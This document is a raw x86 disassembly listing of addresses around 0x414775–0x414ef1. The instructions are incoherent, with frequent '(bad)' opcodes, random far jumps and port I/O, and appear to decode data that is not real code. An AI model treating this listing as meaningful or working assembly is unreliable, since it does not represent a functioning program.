  414775:	imul   esi,DWORD PTR [esi+0x27c3b5da],0xa04fa7c1
  41477f:	adc    bl,dl
  414781:	jae    0x4147a8
  414783:	loope  0x4147dc
  414785:	dec    esp
  414786:	sar    al,1
  414788:	sbb    eax,0x9ea15a25
  41478d:	ja     0x4147ad
  41478f:	call   0x1fe2:0xaa0c2013
  414796:	cmp    eax,edi
  414798:	sbb    al,0xab
  41479a:	(bad)  
  41479b:	sahf   
  41479c:	jmp    0x4147a9
  41479e:	lock lock ja 0x4147fc
  4147a2:	mov    edx,0xef725385
  4147a7:	out    0xed,eax
  4147a9:	adc    BYTE PTR [edi-0x40c3de05],0x9c
  4147b0:	push   ss
  4147b1:	push   eax
  4147b2:	fidiv  DWORD PTR [esi+0x2a]
  4147b5:	sahf   
  4147b6:	mov    bl,BYTE PTR [eax-0x4c]
  4147b9:	or     esp,DWORD PTR [eax]
  4147bb:	pop    es
  4147bc:	ss jae 0x41479f
  4147bf:	clc    
  4147c0:	call   0x6f3e8702
  4147c5:	dec    eax
  4147c6:	loop   0x414804
  4147c8:	xchg   ebp,eax
  4147c9:	sub    ch,cl
  4147cb:	cmp    DWORD PTR [ebx-0x6b],esp
  4147ce:	dec    edi
  4147cf:	ss add al,0x88
  4147d2:	add    al,0x9b
  4147d4:	dec    edi
  4147d5:	mul    DWORD PTR [ebp-0x20]
  4147d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d9:	sub    esp,DWORD PTR [edx-0x7f]
  4147dc:	add    ecx,DWORD PTR [ebx+0x43]
  4147df:	ins    DWORD PTR es:[edi],dx
  4147e0:	mov    edx,0xd096cb90
  4147e5:	mov    edx,0xa06ec338
  4147ea:	pop    ss
  4147eb:	or     cl,BYTE PTR [ebx]
  4147ed:	dec    eax
  4147ee:	into   
  4147ef:	jmp    0x7c2b:0xbea2c594
  4147f6:	dec    ebx
  4147f7:	xchg   al,bh
  4147f9:	(bad)  
  4147fa:	or     edi,DWORD PTR [edx+0x44]
  4147fd:	lods   eax,DWORD PTR ds:[esi]
  4147fe:	mov    esp,0x57e986bf
  414803:	jbe    0x414842
  414805:	cmp    esp,DWORD PTR [eax+0x21]
  414808:	and    eax,0xb7d0a9fc
  41480d:	je     0x414881
  41480f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414810:	dec    ecx
  414811:	addr16 dec ecx
  414813:	in     al,0x7c
  414815:	rcl    BYTE PTR [esi-0x47],0xe2
  414819:	cmp    ch,BYTE PTR [esi-0x314da7c5]
  41481f:	push   esi
  414820:	(bad)  
  414821:	jnp    0x414804
  414823:	mov    gs,WORD PTR [esp+edx*4]
  414826:	dec    eax
  414827:	sbb    al,0xdc
  414829:	sub    DWORD PTR [edx-0x13],0x74395b6b
  414830:	xchg   ecx,eax
  414831:	adc    eax,0xb249a23c
  414836:	jmp    0xa8be:0x3399a09a
  41483d:	add    esi,ecx
  41483f:	inc    esi
  414840:	pop    edi
  414841:	mov    ss,WORD PTR [edi]
  414843:	and    DWORD PTR [ecx+0x39],0xc558cba8
  41484a:	outs   dx,DWORD PTR ds:[esi]
  41484b:	push   eax
  41484c:	arpl   cx,sp
  41484e:	xchg   ebp,eax
  41484f:	jns    0x4147fc
  414851:	pop    es
  414852:	sub    al,0xa2
  414854:	mov    ds:0xf9bf783c,al
  414859:	and    ebp,ecx
  41485b:	pop    eax
  41485c:	aaa    
  41485d:	test   al,0x21
  41485f:	push   0xffffffdf
  414861:	jbe    0x414834
  414863:	mov    es,WORD PTR [edi+0x72]
  414866:	rol    BYTE PTR [esi+ebp*1],1
  414869:	aas    
  41486a:	mov    dl,0x6a
  41486c:	add    dl,bh
  41486e:	icebp  
  41486f:	idiv   edi
  414871:	xchg   ah,bl
  414873:	mov    bh,0x27
  414875:	add    DWORD PTR [ebp-0x7780d619],ecx
  41487b:	dec    ecx
  41487c:	jne    0x4148dd
  41487e:	or     al,0xc5
  414880:	jmp    0x414871
  414882:	imul   esp,DWORD PTR [ecx+eax*4+0xe4bcad5],0x75e960ab
  41488d:	ret    0x4a3c
  414890:	cmp    al,dl
  414892:	jne    0x414889
  414894:	retf   0xdd7d
  414897:	(bad)  
  414898:	jle    0x4148a3
  41489a:	xchg   esp,eax
  41489b:	(bad)  
  41489d:	xor    al,0xd3
  41489f:	dec    ecx
  4148a0:	jbe    0x4148dc
  4148a2:	jl     0x414880
  4148a4:	push   ebx
  4148a5:	add    ah,BYTE PTR [ecx-0x69ea5241]
  4148ab:	sub    bh,0xa6
  4148ae:	les    esp,FWORD PTR [edi-0x13]
  4148b1:	cmp    ebp,edx
  4148b3:	leave  
  4148b4:	jne    0x414920
  4148b6:	fmul   st(2),st
  4148b8:	repnz adc eax,0xf1ab4c27
  4148be:	stc    
  4148bf:	sub    cl,BYTE PTR [edx]
  4148c1:	mov    edi,0x3d068512
  4148c6:	bound  edi,QWORD PTR [ecx-0x25]
  4148c9:	inc    eax
  4148ca:	addr16 je 0x414870
  4148cd:	xchg   BYTE PTR [ebp+0x6501841],ah
  4148d3:	fst    QWORD PTR [eax-0x4a]
  4148d6:	jecxz  0x414892
  4148d8:	gs ins DWORD PTR es:[edi],dx
  4148da:	xchg   edi,eax
  4148db:	cwde   
  4148dc:	cdq    
  4148dd:	adc    ch,BYTE PTR [esi]
  4148df:	fistp  DWORD PTR [edi+ebp*8-0x68f362af]
  4148e6:	ins    BYTE PTR es:[edi],dx
  4148e7:	pop    edi
  4148e8:	mov    cl,0x43
  4148ea:	sub    edi,DWORD PTR [edi+0x1bbb3eee]
  4148f0:	outs   dx,DWORD PTR ds:[esi]
  4148f1:	lahf   
  4148f2:	and    al,0xe0
  4148f4:	shl    DWORD PTR ds:0xa0b6178b,cl
  4148fa:	dec    ebx
  4148fb:	add    DWORD PTR [ebp+0x3e],0xf17dcb16
  414902:	xchg   esi,eax
  414903:	sbb    DWORD PTR [edx-0x1e],ecx
  414906:	mov    esi,0xa5a7e4e8
  41490b:	pop    edi
  41490c:	mov    al,0xd7
  41490e:	shr    DWORD PTR [eax+ebp*1-0x540a286e],1
  414915:	xor    bh,BYTE PTR [ebp+0x5cc3f8f6]
  41491b:	push   edi
  41491c:	adc    bh,dl
  41491e:	adc    ecx,DWORD PTR [ebx+0x2207978c]
  414924:	call   0x14edfa5a
  414929:	outs   dx,BYTE PTR ds:[esi]
  41492a:	sub    eax,0xe25b2b9a
  41492f:	pop    edx
  414930:	sbb    DWORD PTR [ebx+ecx*1+0x25],esp
  414934:	jecxz  0x4148ce
  414936:	ret    
  414937:	(bad)  
  414938:	cmp    al,BYTE PTR [eax-0x22d48ae5]
  41493e:	pop    es
  41493f:	inc    esi
  414940:	push   esp
  414941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414942:	je     0x4148f5
  414944:	push   0xffffffd5
  414946:	dec    ebx
  414947:	mov    ?,WORD PTR [ebx-0x563fb91e]
  41494d:	inc    ecx
  41494e:	int3   
  41494f:	add    BYTE PTR [esi+0x73],ch
  414952:	(bad)  [eax+0x32]
  414955:	cmp    eax,0x78894c2b
  41495a:	cmp    esi,ebp
  41495c:	jp     0x41495a
  41495e:	sub    al,0x2f
  414960:	or     dl,BYTE PTR [ebp+ebx*8+0x70]
  414964:	jmp    0xb065166c
  414969:	jl     0x4148eb
  41496b:	popf   
  41496c:	ins    DWORD PTR es:[edi],dx
  41496d:	rcl    DWORD PTR [ebx+0x50],1
  414970:	fcom   DWORD PTR [edi-0x38]
  414973:	popf   
  414974:	out    dx,al
  414975:	(bad)  
  414976:	movzx  edx,ch
  414979:	imul   esi,ebx,0x59
  41497c:	mov    ds:0xa5df3ec0,eax
  414981:	jae    0x41490f
  414983:	repnz fisubr WORD PTR [ebp-0x23]
  414987:	les    esp,FWORD PTR [ecx-0x60ea7c31]
  41498d:	inc    edi
  41498e:	fild   WORD PTR [edi-0xe78e879]
  414994:	sub    al,0xad
  414996:	or     ah,BYTE PTR [edi*8+0x56b2e357]
  41499d:	fwait
  41499e:	into   
  41499f:	xchg   ebp,eax
  4149a0:	and    al,0xf9
  4149a2:	ret    0x1aa4
  4149a5:	pop    ebx
  4149a6:	repnz stos BYTE PTR es:[edi],al
  4149a8:	jae    0x414a27
  4149aa:	push   edx
  4149ab:	mov    edx,DWORD PTR [edx+0x5af62a4b]
  4149b1:	into   
  4149b2:	sub    ah,BYTE PTR [ecx]
  4149b4:	jno    0x414960
  4149b6:	cmc    
  4149b7:	loop   0x41499c
  4149b9:	jp     0x414a18
  4149bb:	ror    DWORD PTR [edx-0x62],0x4e
  4149bf:	mov    ds:0xe8a9c65a,eax
  4149c4:	rcl    DWORD PTR [edi-0x6a0c6c6a],1
  4149ca:	sbb    bh,BYTE PTR [ecx+0x3b]
  4149cd:	adc    al,0xd3
  4149cf:	(bad)  [edi]
  4149d1:	mov    dh,0x9f
  4149d3:	jbe    0x414a1c
  4149d5:	push   edx
  4149d6:	addr16 and al,0x21
  4149d9:	pushf  
  4149da:	dec    ebx
  4149db:	mov    ah,0x3
  4149dd:	push   edi
  4149de:	xchg   BYTE PTR [edx-0x34f5de36],bh
  4149e4:	sub    BYTE PTR fs:[edi-0x2e],dl
  4149e8:	sbb    eax,0xf7c032a3
  4149ed:	loopne 0x414a1b
  4149ef:	xchg   ebp,eax
  4149f1:	lods   eax,DWORD PTR ds:[esi]
  4149f2:	add    eax,0x9e2ce337
  4149f7:	mov    edx,0xf4af9177
  4149fc:	xor    BYTE PTR [ecx+0x23],cl
  4149ff:	push   edx
  414a00:	call   0xa7a3:0x61ab2f0c
  414a07:	shr    BYTE PTR [ebx-0x6b],cl
  414a0a:	pcmpgtd mm0,QWORD PTR [esi+0x62]
  414a0e:	cmp    eax,0x28167525
  414a13:	pop    ss
  414a14:	push   edi
  414a15:	mov    ebx,DWORD PTR [eax+0x7c]
  414a18:	adc    eax,0xd55de531
  414a1d:	aas    
  414a1e:	mov    esi,0x33205f09
  414a23:	xor    eax,0xff07ed5a
  414a28:	arpl   ax,di
  414a2a:	bound  esp,QWORD PTR [ebp-0x16]
  414a2d:	mov    esp,0x6f7917e2
  414a32:	daa    
  414a33:	cwde   
  414a34:	jb     0x4149b6
  414a36:	out    0x17,eax
  414a38:	xor    BYTE PTR [edi],dl
  414a3a:	aam    0xaf
  414a3c:	fidivr DWORD PTR [esi-0x600cdd7b]
  414a42:	dec    ebx
  414a43:	cmp    eax,0x4cdb3273
  414a48:	fidiv  DWORD PTR ds:0x28cff3b4
  414a4e:	xor    eax,0x48f2a9ef
  414a53:	sbb    DWORD PTR [eax+0x73b34996],esp
  414a59:	iret   
  414a5a:	inc    ebp
  414a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5c:	adc    al,0x44
  414a5e:	shr    BYTE PTR [ebx],0x29
  414a61:	jg     0x414a89
  414a63:	push   esp
  414a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a65:	inc    esi
  414a66:	or     eax,esp
  414a68:	jmp    0x414a9a
  414a6a:	sar    BYTE PTR [ecx+0x60],cl
  414a6d:	push   edi
  414a6e:	retf   0x288f
  414a71:	mov    WORD PTR fs:[esi+0x2d],?
  414a75:	iret   
  414a76:	mov    dl,0x26
  414a78:	(bad)  
  414a79:	pop    es
  414a7a:	scas   al,BYTE PTR es:[edi]
  414a7b:	jbe    0x414a56
  414a7d:	push   ss
  414a7e:	stos   DWORD PTR es:[edi],eax
  414a7f:	mov    ecx,0x6644b08f
  414a84:	xchg   ebp,eax
  414a85:	out    dx,eax
  414a86:	sub    DWORD PTR [ecx+eax*8-0x5c],edi
  414a8a:	add    DWORD PTR [eax+0x49],0xa3bfbf65
  414a91:	xchg   ebx,eax
  414a92:	popa   
  414a93:	cli    
  414a94:	push   esp
  414a95:	pop    ss
  414a96:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414a98:	icebp  
  414a99:	rcr    DWORD PTR [ebx-0x7],0x8f
  414a9d:	sub    eax,DWORD PTR [eax+0x6661838b]
  414aa3:	rcl    esi,1
  414aa5:	std    
  414aa6:	jne    0x414b1c
  414aa8:	cmp    esi,esi
  414aaa:	fnclex 
  414aac:	push   ss
  414aad:	inc    edi
  414aae:	ror    DWORD PTR [esi+ebx*1-0x1c5521ef],1
  414ab5:	xor    eax,0x409089b9
  414aba:	push   esp
  414abb:	jns    0x414ada
  414abd:	add    dl,BYTE PTR [ebx-0x692c11ce]
  414ac3:	xchg   ebx,eax
  414ac4:	pop    edx
  414ac5:	inc    esp
  414ac6:	xchg   edi,eax
  414ac7:	xlat   BYTE PTR ds:[ebx]
  414ac8:	jae    0x414b01
  414aca:	sbb    esp,DWORD PTR [edx]
  414acc:	add    DWORD PTR [edi+0x427b9e42],edx
  414ad2:	xchg   edx,eax
  414ad3:	pop    ss
  414ad4:	or     al,0x62
  414ad6:	dec    ecx
  414ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad8:	mov    edi,0x57333d29
  414add:	jne    0x414a93
  414adf:	jecxz  0x414a96
  414ae1:	xchg   edi,eax
  414ae2:	sub    DWORD PTR [edi],ecx
  414ae4:	xchg   esp,eax
  414ae5:	or     eax,0x9f899476
  414aea:	outs   dx,DWORD PTR ds:[esi]
  414aeb:	sbb    bl,cl
  414aed:	jbe    0x414a9f
  414aef:	xchg   ecx,eax
  414af0:	jno    0x414ad5
  414af2:	aam    0xbd
  414af4:	sbb    DWORD PTR [ebx-0x5e],ebx
  414af7:	outs   dx,DWORD PTR ds:[esi]
  414af8:	push   0x632afc95
  414afd:	cmp    eax,0x11383392
  414b02:	fnstcw WORD PTR [ecx+0x79]
  414b05:	test   eax,0x6df10d6b
  414b0a:	lds    ebx,FWORD PTR [edi]
  414b0c:	mov    dl,0x2c
  414b0e:	shl    BYTE PTR [esi+0x155201f6],cl
  414b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b15:	ss popf 
  414b17:	inc    esi
  414b18:	mov    al,0x39
  414b1a:	rcl    DWORD PTR [eax],cl
  414b1c:	cmp    dl,BYTE PTR [ecx]
  414b1e:	jae    0x414aaa
  414b20:	lods   al,BYTE PTR ds:[esi]
  414b21:	add    ch,BYTE PTR [edx-0xd]
  414b24:	dec    esp
  414b25:	fbld   TBYTE PTR [edx]
  414b27:	jnp    0x414ad1
  414b29:	out    dx,eax
  414b2a:	out    dx,al
  414b2b:	sub    eax,esp
  414b2d:	add    BYTE PTR [ebp+0x2f346553],bh
  414b33:	repz and DWORD PTR [ebp-0x65],eax
  414b37:	lea    eax,[edi+0x46]
  414b3a:	sbb    al,0x90
  414b3c:	popa   
  414b3d:	add    DWORD PTR [esi-0x3565c04f],esi
  414b43:	ficomp DWORD PTR [edx+0x49]
  414b46:	iret   
  414b47:	es pop edx
  414b49:	aad    0xf2
  414b4b:	pop    es
  414b4c:	mov    eax,DWORD PTR [esi]
  414b4e:	sub    DWORD PTR [edi+0xf3e95f1],esp
  414b54:	jge    0x414b48
  414b56:	or     al,0xcd
  414b58:	jp     0x414b9b
  414b5a:	das    
  414b5b:	hlt    
  414b5c:	push   esp
  414b5d:	cmp    BYTE PTR [edx-0x7a],bl
  414b60:	adc    cl,BYTE PTR [eax+0x69d959b1]
  414b66:	arpl   WORD PTR [edi-0xe],di
  414b69:	mov    DWORD PTR [eax+esi*4-0x71461532],ebp
  414b70:	mov    ebx,DWORD PTR ds:0x4b475a2
  414b76:	jns    0x414b03
  414b78:	js     0x414bb1
  414b7a:	fwait
  414b7b:	out    0xa6,al
  414b7d:	sbb    ecx,DWORD PTR [edi]
  414b7f:	and    edi,DWORD PTR [eax]
  414b81:	xchg   ebx,eax
  414b82:	or     eax,0x697159d
  414b87:	pushf  
  414b88:	imul   ebx,DWORD PTR [eax+0x519ea20d],0x6c
  414b8f:	push   esp
  414b90:	jle    0x414b6b
  414b92:	stos   DWORD PTR es:[edi],eax
  414b93:	in     eax,0xcb
  414b95:	mov    edx,DWORD PTR [edx]
  414b97:	(bad)  
  414b98:	not    BYTE PTR [edi-0x78]
  414b9b:	push   ebx
  414b9c:	repnz dec ebp
  414b9e:	popa   
  414b9f:	xchg   esi,eax
  414ba0:	jecxz  0x414ba2
  414ba2:	cmp    DWORD PTR [eax+0x49],esp
  414ba5:	cmc    
  414ba6:	pushf  
  414ba7:	leave  
  414ba8:	mov    edi,0x5d892992
  414bad:	xchg   ebp,eax
  414bae:	rol    dl,cl
  414bb0:	xor    cl,BYTE PTR [edi+eiz*2-0x15cd472]
  414bb7:	push   cs
  414bb8:	push   ss
  414bb9:	dec    esi
  414bba:	mov    ebx,0x9588c135
  414bbf:	push   edi
  414bc0:	mov    ch,BYTE PTR [edx-0x536ee98f]
  414bc6:	jecxz  0x414c3a
  414bc8:	ficom  WORD PTR [ebx+eax*8]
  414bcb:	jns    0x414b94
  414bcd:	pop    eax
  414bce:	clc    
  414bcf:	jp     0x414b59
  414bd1:	stos   BYTE PTR es:[edi],al
  414bd2:	cmp    DWORD PTR [ebp-0x40613062],eax
  414bd8:	push   eax
  414bd9:	aad    0x1a
  414bdb:	mov    ds,WORD PTR [eax]
  414bdd:	inc    ebp
  414bde:	sahf   
  414bdf:	imul   ecx,DWORD PTR [eax-0x46],0xc70759c2
  414be6:	fdivr  st,st(6)
  414be8:	push   esi
  414be9:	sbb    BYTE PTR [ebx+0x57aacbd0],ch
  414bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf0:	es push ss
  414bf2:	jns    0x414bfe
  414bf4:	and    eax,0x5ccdd4d
  414bf9:	jge    0x414c1c
  414bfb:	cmp    BYTE PTR [eax+edi*1+0x77f946c7],cl
  414c02:	fadd   QWORD PTR [ecx-0x2aacc59]
  414c08:	inc    edi
  414c09:	lds    edx,FWORD PTR [ebp+esi*8+0x51]
  414c0d:	dec    ebp
  414c0e:	bound  ecx,QWORD PTR [edx+0x16]
  414c11:	lock imul edx,DWORD PTR [ebp+0x4b5e5916],0xffffffa0
  414c19:	xchg   DWORD PTR cs:[ebx],eax
  414c1c:	pop    edi
  414c1d:	mov    cl,BYTE PTR [edx]
  414c1f:	loope  0x414c72
  414c21:	xchg   edx,eax
  414c22:	adc    ecx,eax
  414c24:	loope  0x414bd8
  414c26:	(bad)  
  414c27:	fwait
  414c28:	loop   0x414bcc
  414c2a:	stos   BYTE PTR es:[edi],al
  414c2b:	shr    BYTE PTR [ecx],cl
  414c2d:	(bad)  
  414c2e:	jns    0x414c28
  414c30:	enter  0x70f,0x64
  414c34:	xor    DWORD PTR [ebp-0x19],0xffffffd8
  414c38:	out    dx,al
  414c39:	mov    edi,0x9959a66c
  414c3e:	rol    BYTE PTR [esi+0x67],1
  414c41:	arpl   WORD PTR [edi+0x1c5480a0],di
  414c47:	cmc    
  414c48:	jbe    0x414c4d
  414c4a:	jne    0x414c8f
  414c4c:	sbb    DWORD PTR [ebx],edi
  414c4e:	jp     0x414c7f
  414c50:	fldenv [edx-0x654ee512]
  414c56:	mov    cl,0xd3
  414c58:	xor    eax,0x91d04be7
  414c5d:	or     DWORD PTR [edx-0x4228ca28],eax
  414c63:	mov    edx,ss
  414c65:	xchg   edi,eax
  414c66:	int3   
  414c67:	in     al,0x49
  414c69:	imul   BYTE PTR [ebx-0x54]
  414c6c:	call   0xe2e70188
  414c71:	push   eax
  414c72:	sbb    DWORD PTR [edx],esi
  414c74:	push   ecx
  414c75:	xchg   ebx,eax
  414c76:	cmp    BYTE PTR [ebx-0x9fcd07c],0x83
  414c7d:	xchg   esp,eax
  414c7e:	sbb    ah,BYTE PTR [edi+0x72c66513]
  414c84:	sub    ch,dh
  414c86:	pop    ds
  414c87:	adc    al,0xc9
  414c89:	frstor [edi+0x40]
  414c8c:	pop    ss
  414c8d:	add    al,BYTE PTR [edi+esi*8]
  414c90:	retf   
  414c91:	adc    bl,dl
  414c93:	push   edx
  414c94:	cmc    
  414c95:	outs   dx,DWORD PTR ds:[esi]
  414c96:	sti    
  414c97:	xor    DWORD PTR [edi+0xd],edi
  414c9a:	pop    edi
  414c9b:	sbb    al,0xec
  414c9d:	ror    BYTE PTR [eax],0x29
  414ca0:	in     eax,dx
  414ca1:	sbb    al,0xfe
  414ca3:	lds    ebx,FWORD PTR [edx]
  414ca5:	lods   eax,DWORD PTR ds:[esi]
  414ca6:	dec    ebx
  414ca7:	push   ebx
  414ca8:	ins    DWORD PTR es:[edi],dx
  414ca9:	mov    ch,0x56
  414cab:	fcomp  QWORD PTR [ecx]
  414cad:	imul   edx,DWORD PTR [ecx+edi*8],0xb433cb39
  414cb4:	cwde   
  414cb5:	stos   DWORD PTR es:[edi],eax
  414cb6:	inc    eax
  414cb7:	(bad)  
  414cb8:	adc    DWORD PTR [edi-0x37],esp
  414cbb:	idiv   DWORD PTR [esi]
  414cbd:	ins    DWORD PTR es:[edi],dx
  414cbe:	sub    ah,0x79
  414cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc2:	imul   esi
  414cc4:	pop    ss
  414cc5:	add    DWORD PTR [esi+0x26],0x3c
  414cc9:	dec    edx
  414cca:	fsub   QWORD PTR [ecx-0x5a]
  414ccd:	mov    fs,WORD PTR [ecx-0x4f]
  414cd0:	(bad)  
  414cd1:	adc    eax,0x858979a5
  414cd6:	sub    DWORD PTR [esp+eiz*4-0x49],ecx
  414cda:	scas   al,BYTE PTR es:[edi]
  414cdb:	pop    ecx
  414cdc:	outs   dx,DWORD PTR ds:[esi]
  414cdd:	imul   ebp,ebx,0x30d1fb5d
  414ce3:	clc    
  414ce4:	add    al,BYTE PTR [esi+0x33f1d6f7]
  414cea:	jp     0x414c9d
  414cec:	lock call 0xb2fb:0x30e95893
  414cf4:	lahf   
  414cf5:	mov    dh,0xe6
  414cf7:	or     ebx,ebp
  414cf9:	xor    BYTE PTR [edi],bl
  414cfb:	stc    
  414cfc:	aas    
  414cfd:	lahf   
  414cfe:	dec    edx
  414cff:	push   es
  414d00:	loop   0x414ccf
  414d02:	mov    ebp,0xee80e644
  414d07:	xchg   DWORD PTR [esi+edi*1-0x278b1daf],ebp
  414d0e:	pop    ebp
  414d0f:	jmp    0x414cc5
  414d11:	pop    eax
  414d12:	push   ecx
  414d13:	lods   al,BYTE PTR ds:[esi]
  414d14:	add    dh,BYTE PTR [ecx-0x49]
  414d17:	jg     0x414cc1
  414d19:	adc    eax,0xb4727a02
  414d1e:	(bad)  
  414d1f:	lods   al,BYTE PTR ds:[esi]
  414d20:	ror    DWORD PTR [ebp+0x2],1
  414d23:	(bad)  
  414d24:	lea    edi,gs:[eax-0x16]
  414d28:	sahf   
  414d29:	add    esp,0x93da3018
  414d2f:	int    0x80
  414d31:	les    ebp,FWORD PTR [ecx]
  414d33:	leave  
  414d34:	lahf   
  414d35:	fst    DWORD PTR [ebp-0x65569388]
  414d3b:	loop   0x414d6d
  414d3d:	je     0x414d67
  414d3f:	jno    0x414d85
  414d41:	xchg   esp,eax
  414d42:	inc    esi
  414d43:	adc    DWORD PTR [ecx+0x1692e003],eax
  414d49:	push   esp
  414d4a:	sar    BYTE PTR [edi+0x260b0054],cl
  414d50:	inc    esp
  414d51:	xchg   ecx,eax
  414d52:	xor    ebx,DWORD PTR [ecx]
  414d54:	imul   ecx,edi,0xc5e48e0a
  414d5a:	add    BYTE PTR [eax+0x604f19af],0xb1
  414d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d62:	pop    edi
  414d63:	jge    0x414d67
  414d65:	stos   DWORD PTR es:[edi],eax
  414d66:	inc    ebp
  414d67:	mov    ebx,0xeb4413ab
  414d6c:	sti    
  414d6d:	(bad)  
  414d6e:	dec    edx
  414d6f:	mov    WORD PTR [esi+0x6733edac],?
  414d75:	retf   
  414d76:	dec    esi
  414d77:	daa    
  414d78:	jp     0x414d61
  414d7a:	sub    eax,0x34210d35
  414d7f:	ins    BYTE PTR es:[edi],dx
  414d80:	xor    bh,ch
  414d82:	jge    0x414d36
  414d84:	pop    ebx
  414d85:	xor    cl,bl
  414d87:	ss xchg edx,eax
  414d89:	xor    ebx,esp
  414d8b:	dec    ecx
  414d8c:	popa   
  414d8d:	call   0xebe7:0xe7b544fb
  414d94:	adc    dh,BYTE PTR ds:0x947d8dda
  414d9a:	mov    ds:0x7050021d,eax
  414d9f:	data16 jp 0x414d69
  414da2:	cwde   
  414da3:	mov    esi,0x6ab78a17
  414da8:	jo     0x414d4e
  414daa:	or     edx,DWORD PTR [edx]
  414dac:	sub    DWORD PTR [ebx],eax
  414dae:	in     al,dx
  414daf:	jne    0x414dbf
  414db1:	dec    ebp
  414db2:	sbb    BYTE PTR [ebp-0x52],dl
  414db5:	add    ebp,DWORD PTR [esi+0xf]
  414db8:	xor    edx,ebp
  414dba:	cmp    eax,DWORD PTR [ecx-0x6b12ee9b]
  414dc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc1:	and    DWORD PTR [edx+edi*2+0x1],esp
  414dc5:	cmp    al,0x58
  414dc7:	adc    eax,0x6d4df068
  414dcc:	mov    ebx,0x96fa8a47
  414dd1:	mov    WORD PTR [ebx-0x53],cs
  414dd4:	xchg   esi,eax
  414dd5:	shr    BYTE PTR [edi+0x141769c],0x19
  414ddc:	or     BYTE PTR [edx-0x7834b8ae],dh
  414de2:	adc    ah,cl
  414de4:	add    bh,BYTE PTR [ebx-0x1e133512]
  414dea:	mov    bh,BYTE PTR [esi]
  414dec:	ins    DWORD PTR es:[edi],dx
  414ded:	call   0xe00f857d
  414df2:	ret    
  414df3:	mov    al,ds:0x460e37
  414df8:	xchg   edx,eax
  414df9:	cmp    eax,0xf4fbd0af
  414dfe:	shr    BYTE PTR [ebp+0x1a6d330c],1
  414e04:	in     eax,dx
  414e05:	dec    ecx
  414e06:	xchg   edi,eax
  414e07:	dec    ebp
  414e08:	test   BYTE PTR [edx-0x3a41e93b],0xa6
  414e0f:	shr    BYTE PTR [esi-0x13],0x31
  414e13:	std    
  414e14:	jno    0x414dfa
  414e16:	imul   esp,edx,0xad1dc15b
  414e1c:	push   esi
  414e1d:	stos   DWORD PTR es:[edi],eax
  414e1e:	inc    esi
  414e1f:	in     al,dx
  414e20:	pusha  
  414e21:	loope  0x414e8c
  414e23:	std    
  414e24:	adc    DWORD PTR [edi],edi
  414e26:	mov    esi,0x178a2372
  414e2b:	std    
  414e2c:	(bad)  
  414e2e:	sub    bl,BYTE PTR [eax]
  414e30:	push   es
  414e31:	or     bl,bh
  414e33:	rcl    BYTE PTR ds:0x25d72e28,0x8f
  414e3a:	fwait
  414e3b:	jg     0x414e56
  414e3d:	add    ah,BYTE PTR [edx+0x3592ca0c]
  414e43:	shl    DWORD PTR [ebx],0xf3
  414e46:	clc    
  414e47:	es out 0xeb,al
  414e4a:	repnz stc 
  414e4c:	jae    0x414df9
  414e4e:	dec    ebp
  414e4f:	jmp    0x821b:0xe6fdecdc
  414e56:	sub    ch,ah
  414e58:	jb     0x414deb
  414e5a:	dec    ebp
  414e5b:	and    edx,DWORD PTR [ecx]
  414e5d:	push   eax
  414e5e:	push   edx
  414e5f:	mov    esi,0xcb866316
  414e64:	mov    dl,0x3b
  414e66:	and    BYTE PTR [ebx-0x6345225],ah
  414e6c:	add    BYTE PTR [edi],bh
  414e6e:	mov    BYTE PTR [eax+ebp*4-0x47],dl
  414e72:	pushf  
  414e73:	inc    edx
  414e74:	pop    edx
  414e75:	push   ebx
  414e76:	sti    
  414e77:	enter  0xbcdf,0x1b
  414e7b:	test   DWORD PTR [edi+0x42],eax
  414e7e:	(bad)  
  414e7f:	and    edx,eax
  414e81:	icebp  
  414e82:	pop    esp
  414e83:	shl    dh,cl
  414e85:	imul   ebp,DWORD PTR [esp+ebp*2-0x7fcd0c75],0xa7de3eb2
  414e90:	std    
  414e91:	ins    DWORD PTR es:[edi],dx
  414e92:	js     0x414ecf
  414e94:	mov    al,ds:0xe70d9244
  414e99:	imul   DWORD PTR [ebx]
  414e9b:	jo     0x414eea
  414e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e9e:	sbb    al,0xf9
  414ea1:	inc    esp
  414ea2:	(bad)  
  414ea3:	scas   al,BYTE PTR es:[edi]
  414ea4:	pop    eax
  414ea5:	icebp  
  414ea6:	xor    bl,ah
  414ea8:	test   BYTE PTR [esi+0x42a75697],bh
  414eae:	hlt    
  414eaf:	cmp    DWORD PTR [ecx+ecx*2],ebx
  414eb2:	sbb    ch,ch
  414eb4:	lods   eax,DWORD PTR ds:[esi]
  414eb5:	dec    ebx
  414eb6:	xchg   edx,eax
  414eb7:	jnp    0x414ef2
  414eb9:	ins    DWORD PTR es:[edi],dx
  414eba:	dec    eax
  414ebb:	push   ss
  414ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ebd:	clc    
  414ebe:	xor    DWORD PTR [esi+edx*8],esp
  414ec1:	nop
  414ec2:	push   esp
  414ec3:	push   ecx
  414ec4:	cmp    cl,BYTE PTR [ecx+0x59118fb8]
  414eca:	dec    ebx
  414ecb:	jecxz  0x414ed2
  414ecd:	scas   al,BYTE PTR es:[edi]
  414ece:	fidiv  WORD PTR [esi-0x21]
  414ed1:	repz adc BYTE PTR [esi-0x32435ec5],dl
  414ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed9:	je     0x414efa
  414edb:	gs push esi
  414edd:	sbb    dl,BYTE PTR [ecx-0x5e]
  414ee0:	jp     0x414ecb
  414ee2:	xor    BYTE PTR [edx-0x63305207],ah
  414ee8:	pop    ds
  414ee9:	rcr    DWORD PTR [eax+ebx*2-0x1f],cl
  414eed:	arpl   WORD PTR [esi-0x70],ax
  414ef0:	dec    esp
  414ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
